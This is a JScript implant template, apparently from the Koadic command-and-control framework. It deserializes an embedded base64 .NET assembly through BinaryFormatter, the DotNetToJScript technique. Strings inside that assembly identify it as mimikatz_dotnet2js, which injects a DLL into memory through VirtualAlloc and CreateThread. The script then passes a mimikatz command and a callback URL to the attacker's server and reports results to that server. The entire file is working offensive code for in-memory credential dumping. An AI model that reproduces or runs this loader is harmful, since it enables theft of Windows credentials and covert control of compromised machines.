function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAtONvWQAAAAAA"+
"AAAA4AAiIAsBMAAACgAAAAYAAAAAAACGKQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAANCkA"+
"AE8AAAAAQAAAyAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAPwnAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAACMCQAAACAAAAAKAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAyAMAAABA"+
"AAAABAAAAAwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAQAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAGgpAAAAAAAASAAAAAIABQDAIAAAPAcAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgIoDgAACgAA"+
"KgAAEzAGAFcAAAABAAARAAMoDwAACgp+EAAACgaOaSAAEAAAH0AoAwAABgsGFgcGjmkoEQAACgAS"+
"AhIBKBIAAAoFalgoEwAAChYNBCgUAAAKEwR+EAAAChYIEQQWEgMoBAAABiYqAEJTSkIBAAEAAAAA"+
"AAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAHACAAAjfgAA3AIAAEADAAAjU3RyaW5ncwAAAAAcBgAA"+
"BAAAACNVUwAgBgAAEAAAACNHVUlEAAAAMAYAAAwBAAAjQmxvYgAAAAAAAAACAAABRxUCFAkAAAAA"+
"+gEzABYAAAEAAAASAAAAAgAAAAQAAAANAAAAFAAAAA4AAAABAAAAAgAAAAIAAAABAAAAAQAAAAAA"+
"CgIBAAAAAAAGACYBkAIGAJMBkAIGAHMAXgIPALACAAAGAJsALgIGAAkBLgIGAOoALgIGAHoBLgIG"+
"AEYBLgIGAF8BLgIGALIALgIGAIcAcQIGAGUAcQIGAM0ALgIGABgDJwIGADADJwIGAFcCJwIGAOgB"+
"cQIAAAAAEwAAAAAAAQABAAEAEAD1AgAAPQABAAEAUCAAAAAAhhhRAgYAAQBcIAAAAACGABwATAAB"+
"AAAAAACAAJYgLwBTAAQAAAAAAIAAliBHAFsACAAAAAEAAQAAAAIAIQIAAAMAKQMAAAEA/wIAAAIA"+
"vQEAAAMAVAAAAAQAHwMAAAEAvwIAAAIAsQEAAAMACQMAAAQARQIAAAUA0gICAAYAPAAJAFECAQAR"+
"AFECBgAZAFECCgApAFECEAAxAFECEAA5AFECEABBAFECEABJAFECEABRAFECEABZAFECEABhAFEC"+
"FQBpAFECEABxAFECEAB5AFECBgCBAMQBIwCJAEACKQCRADgDLACJAAsANQCJAFECOQCRANUBPgAu"+
"AAsAZgAuABMAbwAuABsAjgAuACMAlwAuACsArwAuADMArwAuADsArwAuAEMAlwAuAEsAtQAuAFMA"+
"rwAuAFsArwAuAGMAzQAuAGsA9wBDAFsABAEaAP0B8AFAAQcALwABAEYBCQBHAAIABIAAAAEAAAAA"+
"AAAAAAAAAAAA4gIAAAIAAAAAAAAAAAAAAEMAJgAAAAAAAAAAAABkbGxCYXNlNjQAVG9JbnQ2NAA8"+
"TW9kdWxlPgBJbmplY3RETEwAbXNjb3JsaWIAVmlydHVhbEFsbG9jAGxwVGhyZWFkSWQAQ3JlYXRl"+
"VGhyZWFkAGZsQWxsb2NhdGlvblR5cGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRl"+
"AENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRl"+
"bWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmln"+
"dXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9u"+
"UmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29w"+
"eXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJp"+
"bGl0eUF0dHJpYnV0ZQBkd1N0YWNrU2l6ZQBkd1NpemUARnJvbUJhc2U2NFN0cmluZwBTdHJpbmdU"+
"b0hHbG9iYWxVbmkATWFyc2hhbABLZXJuZWwzMi5kbGwAa2VybmVsMzIuZGxsAG1pbWlrYXR6X2Rv"+
"dG5ldDJqcy5kbGwAcGFyYW0AU3lzdGVtAFN5c3RlbS5SZWZsZWN0aW9uAFplcm8AbHBQYXJhbWV0"+
"ZXIALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9w"+
"U2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBs"+
"cFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAG1pbWlrYXR6X2RvdG5ldDJqcwBUZXN0"+
"Q2xhc3MAbHBBZGRyZXNzAGxwU3RhcnRBZGRyZXNzAE9iamVjdABmbFByb3RlY3QAb2Zmc2V0AENv"+
"bnZlcnQAQ29weQAAAAAAAAAA/xsJLVeNtU6ATgSrFxUnDQAEIAEBCAMgAAEFIAEBEREEIAEBDgQg"+
"AQECCAcFHQUYGAkYBQABHQUOAgYYCAAEAR0FCBgIAyAACgQgAQEKBAABGA4It3pcVhk04IkGIAMB"+
"Dg4IBwAEGBgICQkKAAYJGAkYGAkQCQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRo"+
"cm93cwEIAQAHAQAAAAAXAQASbWltaWthdHpfZG90bmV0MmpzAAAFAQAAAAAXAQASQ29weXJpZ2h0"+
"IMKpICAyMDE3AAApAQAkOTczMTA5ZTUtNmJlMC00Y2M5LWI0ZTYtNTE4MDRhODYwOTljAAAMAQAH"+
"MS4wLjAuMAAABQEAAQAAAAAAAAAAtONvWQAAAAACAAAAHAEAABgoAAAYCgAAUlNEU5eQTkyqXi5C"+
"mWEcSCG9P78BAAAAQzpcVXNlcnNccjAwdFxEZXNrdG9wXHdvcmtzaG9wXGdvb2Rcd29ya3Nob3Bc"+
"bWltaWthdHpfZG90bmV0MmpzXG1pbWlrYXR6X2RvdG5ldDJqc1xvYmpcRGVidWdcbWltaWthdHpf"+
"ZG90bmV0MmpzLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcKQAAAAAAAAAAAAB2"+
"KQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaCkAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2Nv"+
"cmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAA"+
"AAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAbAMAAAAAAAAAAAAAbAM0AAAA"+
"VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAA"+
"AD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8A"+
"AAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBMwCAAABAFMAdAByAGkAbgBn"+
"AEYAaQBsAGUASQBuAGYAbwAAAKgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0A"+
"ZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAABOABMAAQBG"+
"AGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAbQBpAG0AaQBrAGEAdAB6AF8AZABvAHQA"+
"bgBlAHQAMgBqAHMAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAw"+
"AC4AMAAAAE4AFwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAbQBpAG0AaQBrAGEAdAB6AF8A"+
"ZABvAHQAbgBlAHQAMgBqAHMALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBp"+
"AGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA3AAAAKgABAAEATABlAGcA"+
"YQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABWABcAAQBPAHIAaQBnAGkAbgBhAGwARgBp"+
"AGwAZQBuAGEAbQBlAAAAbQBpAG0AaQBrAGEAdAB6AF8AZABvAHQAbgBlAHQAMgBqAHMALgBkAGwA"+
"bAAAAAAARgATAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABtAGkAbQBpAGsAYQB0AHoAXwBk"+
"AG8AdABuAGUAdAAyAGoAcwAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAA"+
"MQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAx"+
"AC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACIOQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"+
"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

  var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();

  var base64DLL = "~SHIMX86B64~";

	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);

  Koadic.work.report("Done");
} catch (e) {
  Koadic.work.error(e);
}
